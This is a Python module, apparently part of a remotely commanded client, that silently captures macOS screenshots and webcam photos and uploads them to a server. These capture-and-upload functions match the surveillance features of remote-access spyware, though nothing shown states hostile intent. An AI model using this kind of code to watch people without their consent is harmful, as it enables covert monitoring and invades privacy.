import os
import subprocess
import tempfile

from client.commands.command_context import CommandCancelledError, CommandTimeoutError
from core.utils.formatting import get_size, get_time


class MacMediaService:
    """
    macOS 截图 / 摄像头相关能力。
    """

    def __init__(self, owner):
        self.owner = owner

    def capture_screenshot(self):
        screenshot_path = f'screenshot_{get_time()}.png'
        capture_command = f'screencapture -x {screenshot_path}'

        try:
            self.owner._send_interim_result(1, f'Capturing screen: {capture_command}')
            result = self.owner._run_shell_command(capture_command, timeout=15)
            if result.returncode != 0:
                return 0, result.stderr or 'Failed to capture screenshot'

            self.owner._send_interim_result(1, 'Screenshot captured successfully', 0)
            return self.owner.http_file_transfer_service.upload_single_file_to_server_result(
                screenshot_path,
                category='screenshot',
            )
        except CommandCancelledError:
            return 0, 'Screenshot command cancelled'
        except (CommandTimeoutError, subprocess.TimeoutExpired):
            return 0, 'Screenshot capture timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to capture screenshot: {e}'
        finally:
            if os.path.isfile(screenshot_path):
                try:
                    os.remove(screenshot_path)
                except Exception:
                    pass

    def capture_webcam_photo(self):
        """拍照并上传到服务器"""
        temp_file = None

        try:
            result = subprocess.run(['which', 'imagesnap'], capture_output=True)
            if result.returncode != 0:
                return 0, '请安装 imagesnap: brew install imagesnap'

            temp_file = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            temp_file.close()

            subprocess.run(
                ['imagesnap', '-w', '1', temp_file.name],
                capture_output=True,
                timeout=5
            )

            if os.path.getsize(temp_file.name) > 0:
                self.owner.http_file_transfer_service.upload_single_file_to_server_result(
                    temp_file.name,
                    category='webcam',
                )
                file_size = get_size(os.path.getsize(temp_file.name))
                return 1, f'Webcam photo captured: {temp_file.name} ({file_size})'

            return 0, 'Failed to capture webcam photo'
        except Exception as e:
            return 0, f'Webcam capture failed: {e}'
        finally:
            if temp_file and os.path.exists(temp_file.name):
                try:
                    os.unlink(temp_file.name)
                except Exception:
                    pass